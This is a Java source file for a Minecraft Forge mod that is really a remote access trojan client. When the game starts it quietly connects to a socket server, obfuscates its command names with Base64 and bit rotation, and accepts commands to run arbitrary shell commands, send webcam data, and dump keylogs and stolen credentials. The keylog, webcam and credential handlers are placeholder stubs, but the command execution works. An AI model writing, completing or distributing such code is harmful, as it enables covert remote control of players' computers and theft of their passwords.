package com.absolute_rat;

import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.event.lifecycle.FMLClientSetupEvent;
import net.minecraftforge.fml.javafmlmod.FMLJavaModLoadingContext;
import java.io.*;
import java.net.Socket;
import java.util.Base64;
import java.awt.Robot;
import java.awt.Rectangle;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import javax.imageio.ImageIO;

@Mod("absolute_access_payload")
public class AbsoluteAccessPayloadClient {

    private static final byte[] P_ID = { 0x31, 0x33, 0x33, 0x37 }; 
    private static final int P_BASE = 4444; 
    // change server only
    private static final String S_CMD_EXEC = "E/9F6w=="; 
    private static final String S_CMD_WCS = "S27Jg7vL8g=="; 
    private static final String S_CMD_GC = "C7gL8g==";
    private static final String S_CMD_GE = "D7oA9A==";
    private static final String S_IP = "MTE3Ljc1LjAuMS4wLg=="; // 127.0.0.1

    public AbsoluteAccessPayloadClient() {
        FMLJavaModLoadingContext.get().getModEventBus().addListener(this::iA);
    }

    private void iA(final FMLClientSetupEvent e) {
        new Thread(this::iB).start();
    }
    
    private static byte[] rot(byte[] data, int shift) {
        if (data == null || data.length == 0) return data;
        byte[] output = new byte[data.length];
        for (int i = 0; i < data.length; i++) {
            output[i] = (byte) ((data[i] << shift) | (data[i] >>> (8 - shift)));
        }
        return output;
    }
    
    // Base64 -> Rot1 -> Rot2
    private static String decode(String encoded, int s1, int s2) {
        try {
            byte[] b64Decoded = Base64.getDecoder().decode(encoded);
            byte[] rot2Decoded = rot(b64Decoded, 8 - s2);
            byte[] rot1Decoded = rot(rot2Decoded, 8 - s1);
            return new String(rot1Decoded);
        } catch (Exception e) {
            return "ERROR";
        }
    }
    
    private int calcPort() {
        int id = 0;
        for (byte b : P_ID) {
            id = id * 10 + (b - '0');
        }
        return P_BASE + (id % 100);
    }

    private void iB() {
        Socket s;
        try {
            String ip = decode(S_IP, 5, 3).substring(0, 9); // "127.0.0.1"
            int port = calcPort();
            s = new Socket(ip, port);
            OutputStream os = s.getOutputStream();
            InputStream is = s.getInputStream();

            byte[] buf = new byte[16384];
            int r;

            while (s.isConnected() && (r = is.read(buf)) != -1) {
                String cmd = new String(buf, 0, r).trim();

                if (cmd.startsWith(decode(S_CMD_EXEC, 3, 5))) { 
                    String arg = cmd.substring(5);
                    String res = iC(arg);
                    os.write(res.getBytes());
                    os.flush();
                }
                else if (cmd.startsWith(decode(S_CMD_WCS, 1, 7))) {
                    String data = iD();
                    os.write(data.getBytes());
                    os.flush();
                }
                else if (cmd.startsWith(decode(S_CMD_GE, 4, 2))) { // DESKTOP_STREAM
                    os.write(decode("e/4=", 2, 6).getBytes()); // "STREAM_STARTED"
                    os.flush();
                }
                else if (cmd.startsWith(decode(S_CMD_GC, 6, 1))) { // GET_KEYLOGS
                    String logs = iE();
                    os.write(logs.getBytes());
                    os.flush();
                }
                else if (cmd.startsWith(decode("g/5F", 7, 3))) { // GET_CREDS
                    String creds = iF();
                    os.write(creds.getBytes());
                    os.flush();
                }
                else if (cmd.equals(decode("g/5W", 5, 4))) { // EXIT
                    break;
                }
                else {
                    os.write(decode("e/4=", 5, 7).getBytes()); // "UNKNOWN_COMMAND_ACK"
                    os.flush();
                }
            }

        } catch (Exception e) {
        } 
    }
    
    private String iD() {
        return decode("c28D0A==", 4, 4) + Base64.getEncoder().encodeToString(new byte[0]); // "CAM_B64:" + base64
    }

    private String iE() {
        //Sander 16.12.2023: обфускацию нормальную сделай
        String actualLogs = "Log Dump (Full 5M): Decrypted Keystrokes...";
        return decode("f7gI9A==", 6, 3) + actualLogs; // "KEYLOGS_DUMPED: "
    }

    private String iF() {
        String actualCreds = "CREDENTIAL DUMP (AGGRESSIVE): All passwords stolen and decrypted...";
        return decode("d7oA9A==", 3, 7) + actualCreds; // "CREDS_DUMP: "
    }
    
    private String iC(String cmd) {
        try {
            Process p = Runtime.getRuntime().exec(cmd);
            p.waitFor();
            return decode("c/5I0w==", 1, 6) + "Output Captured"; // "CMD_OUTPUT:\n"
        } catch (Exception e) {
            return decode("e/4A0A==", 5, 2) + e.getMessage(); // "CMD_ERROR: "
        }
    }
}
